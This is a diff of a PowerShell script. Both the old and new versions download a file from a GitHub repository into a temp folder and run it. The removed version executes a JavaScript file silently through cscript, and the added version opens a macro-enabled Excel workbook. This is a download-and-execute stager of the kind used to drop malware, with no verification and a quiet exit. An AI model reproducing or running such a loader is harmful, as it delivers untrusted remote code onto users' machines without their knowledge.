@@ -1,8 +1,8 @@
 <#
 .SYNOPSIS
-    Downloads and executes a JavaScript (.js) file in %TEMP%\MyExcelTemp.
+    Downloads and opens an Excel (.xlsm) file in %TEMP%\MyExcelTemp.
 .DESCRIPTION
-    This script downloads a specified .js file, runs it using cscript, and exits silently.
+    This script downloads a specified .xlsm file and opens it using Excel.
 .NOTES
     Requires PowerShell 3.0 or later.
 #>
@@ -10,11 +10,11 @@
 # Use the temp folder path
 $folderPath = "$env:TEMP\MyExcelTemp"
 
-# Define the URL of the .js file
-$jsFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/MyFile.js"  # Replace with your actual URL
-$jsFilePath = "$folderPath\MyFile.js"
+# Define the URL of the .xlsm file
+$xlsmFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/imarc.xlsm"  # Replace with your actual URL
+$xlsmFilePath = "$folderPath\imarc.xlsm"
 
-# Function to download the .js file
+# Function to download the .xlsm file
 function Download-File {
     param (
         [string]$url,
@@ -25,15 +25,15 @@ function Download-File {
     $webClient.DownloadFile($url, $filePath)
 }
 
-# Download the .js file
-Download-File -url $jsFileURL -filePath $jsFilePath
+# Download the .xlsm file
+Download-File -url $xlsmFileURL -filePath $xlsmFilePath
 
 # Check if the file was downloaded successfully
-if (Test-Path $jsFilePath) {
-    # Run the .js file using cscript
-    Start-Process "cscript.exe" -ArgumentList "`"$jsFilePath`"" -NoNewWindow
+if (Test-Path $xlsmFilePath) {
+    # Open the .xlsm file using Excel
+    Start-Process "excel.exe" -ArgumentList "`"$xlsmFilePath`""
 } else {
-    Write-Host "Failed to download the .js file."
+    Write-Host "Failed to download the .xlsm file."
 }
 
 # Exit silently
